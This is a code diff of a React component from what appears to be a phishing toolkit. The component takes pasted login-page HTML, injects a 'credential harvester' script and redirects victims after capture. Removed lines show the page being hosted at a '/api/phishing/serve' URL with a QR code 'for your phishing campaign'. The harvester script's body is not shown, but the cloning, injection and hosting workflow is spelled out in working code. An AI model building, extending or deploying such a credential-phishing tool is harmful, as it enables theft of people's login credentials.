@@ -9,11 +9,8 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, AlertTriangle, Globe, Download, Bot, Copy, Wand, StopCircle, Eye, Code } from 'lucide-react';
-import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
+import { Loader2, Globe, Wand, StopCircle } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
-import { QrCodeGenerator } from './qr-code-generator';
-import { Label } from './ui/label';
 import { Textarea } from './ui/textarea';
 
 const pageClonerSchema = z.object({
@@ -68,14 +65,14 @@ const getHarvesterScript = (redirectUrl: string) => `
 </script>
 `;
 
-export function LoginPageCloner() {
+type LoginPageClonerProps = {
+  onHostPage: (htmlContent: string) => void;
+};
+
+export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
   const { toast } = useToast();
   const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
-  const [hostedUrlId, setHostedUrlId] = useState<string | null>(null);
-  const [showPreview, setShowPreview] = useState(false);
-  
   const [isHosting, setIsHosting] = useState(false);
-  const [clonerError, setClonerError] = useState<string | null>(null);
 
   const form = useForm<z.infer<typeof pageClonerSchema>>({
     resolver: zodResolver(pageClonerSchema),
@@ -87,9 +84,7 @@ export function LoginPageCloner() {
   
   const resetState = () => {
       setModifiedHtml(null);
-      setHostedUrlId(null);
-      setClonerError(null);
-      setShowPreview(false);
+      setIsHosting(false);
   }
 
   const onClonerSubmit = (values: z.infer<typeof pageClonerSchema>) => {
@@ -106,167 +101,54 @@ export function LoginPageCloner() {
     }
 
     setModifiedHtml(html);
-    toast({ title: "HTML Prepared", description: "Credential harvester has been injected into the HTML." });
+    toast({ title: "HTML Prepared", description: "Credential harvester has been injected." });
   };
 
   const handleHostPage = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
-    setHostedUrlId(null);
-    setClonerError(null);
-    try {
-      const response = await hostClonedPage({ htmlContent: modifiedHtml });
-      setHostedUrlId(response.pasteId);
-      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
-    } catch (err) {
-       const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
-       setClonerError(errorMessage);
-       console.error(err);
-    } finally {
-      setIsHosting(false);
-    }
-  };
-  
-  const handleStopHosting = () => {
-    resetState();
-    form.setValue('htmlContent', '');
-    toast({
-      title: "Hosting Deactivated",
-      description: "The public URL has been removed and the form has been reset.",
-    });
+    // Instead of a server call, we now pass the content up to the parent page.
+    onHostPage(modifiedHtml);
+    // The parent page will handle navigation, so we don't need to do anything else here.
   };
 
-  const handleDownloadHtml = () => {
-    if (modifiedHtml) {
-      const blob = new Blob([modifiedHtml], { type: 'text/html' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'cloned_login.html';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
-    }
-  };
-
-  const handleCopy = (textToCopy: string) => {
-    navigator.clipboard.writeText(textToCopy);
-    toast({ title: "Copied!", description: "URL copied to clipboard." });
-  }
-
-  const fullHostedUrl = hostedUrlId ? `${window.location.origin}/api/phishing/serve/${hostedUrlId}` : null;
-  
   return (
-    <>
-      <div className="grid lg:grid-cols-5 gap-6">
-        <div className="lg:col-span-2 space-y-6">
-          <Card>
-            <CardHeader>
-              <CardTitle>Page Cloner & Host</CardTitle>
-              <CardDescription>Paste HTML source code to inject a credential harvester and host it.</CardDescription>
-            </CardHeader>
-            <CardContent>
-              <Form {...form}>
-                <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
-                  <FormField control={form.control} name="htmlContent" render={({ field }) => ( 
-                    <FormItem> 
-                      <FormLabel>1. Paste Page HTML</FormLabel>
-                      <FormControl>
-                        <Textarea placeholder="Right-click on a page, 'View Page Source', and paste the HTML here." {...field} className="h-40 font-mono" />
-                      </FormControl>
-                      <FormMessage />
-                    </FormItem> 
-                  )}/>
-                  <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
-                  <Button type="submit">
-                    <Wand className="mr-2 h-4 w-4" />
-                    Inject Harvester
-                  </Button>
-                </form>
-              </Form>
-            </CardContent>
-            {modifiedHtml && (
-              <CardFooter className="flex-col gap-4">
-                <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
-                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
-                    3. Host Page
-                </Button>
-                 <Button onClick={() => setShowPreview(!showPreview)} variant="secondary" className="w-full">
-                    <Eye className="mr-2 h-4 w-4"/> {showPreview ? 'Hide' : 'Show'} Injected Code
-                </Button>
-                <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
-                    <Download className="mr-2 h-4 w-4"/> Download HTML
-                </Button>
-              </CardFooter>
-            )}
-          </Card>
-          
-          {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p className="text-sm">{clonerError}</p></CardContent></Card>}
-          
-          {fullHostedUrl && (
-            <QrCodeGenerator url={fullHostedUrl} />
-          )}
-
-        </div>
-
-        <div className="lg:col-span-3">
-          <Card className="min-h-full">
-            <CardHeader>
-              <CardTitle>Hosted Page Information</CardTitle>
-              <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
-            </CardHeader>
-            <CardContent className="w-full space-y-4">
-              {(isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
-              
-              {!modifiedHtml && !isHosting && !showPreview && (
-                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
-                      <Bot className="h-12 w-12 mb-4" />
-                      <p>Paste HTML content to get started.</p>
-                  </div>
-              )}
-              
-              {modifiedHtml && !fullHostedUrl && !isHosting && !showPreview && (
-                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
-                      <Globe className="h-12 w-12 mb-4" />
-                      <p>HTML is ready.</p>
-                      <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
-                  </div>
-              )}
-              
-              {showPreview && (
-                 <div className="space-y-2">
-                    <Label>Injected HTML Code</Label>
-                    <pre className="h-96 border rounded-md p-2 bg-primary/10 text-xs overflow-auto font-mono">
-                        <code>{modifiedHtml}</code>
-                    </pre>
-                </div>
-              )}
-
-              {fullHostedUrl && !showPreview && (
-                <div className="space-y-4 animate-in fade-in">
-                  <div className="space-y-2">
-                    <Label htmlFor="public-url">Public URL</Label>
-                    <div className="flex items-center gap-2">
-                          <Input id="public-url" readOnly value={fullHostedUrl} className="font-mono"/>
-                          <Button variant="ghost" size="icon" onClick={() => handleCopy(fullHostedUrl)}><Copy className="h-4 w-4"/></Button>
-                    </div>
-                    <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
-                  </div>
-
-                  <div className="flex flex-wrap gap-2">
-                       <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
-                          <StopCircle className="mr-2 h-4 w-4" />
-                          Stop Hosting & Reset
-                      </Button>
-                  </div>
-                </div>
-              )}
-            </CardContent>
-          </Card>
-        </div>
-      </div>
-    </>
+      <Card>
+        <CardHeader>
+          <CardTitle>Page Cloner & Host</CardTitle>
+          <CardDescription>Paste HTML source code to inject a credential harvester and host it.</CardDescription>
+        </CardHeader>
+        <CardContent>
+          <Form {...form}>
+            <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
+              <FormField control={form.control} name="htmlContent" render={({ field }) => ( 
+                <FormItem> 
+                  <FormLabel>1. Paste Page HTML</FormLabel>
+                  <FormControl>
+                    <Textarea placeholder="Right-click on a page, 'View Page Source', and paste the HTML here." {...field} className="h-40 font-mono" />
+                  </FormControl>
+                  <FormMessage />
+                </FormItem> 
+              )}/>
+              <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
+              <Button type="submit">
+                <Wand className="mr-2 h-4 w-4" />
+                Inject Harvester
+              </Button>
+            </form>
+          </Form>
+        </CardContent>
+        {modifiedHtml && (
+          <CardFooter className="flex-col gap-4">
+            <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
+                {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
+                3. Preview & Host Page
+            </Button>
+             <Button onClick={resetState} variant="destructive" className="w-full">
+                <StopCircle className="mr-2 h-4 w-4"/> Reset
+            </Button>
+          </CardFooter>
+        )}
+      </Card>
   );
 }
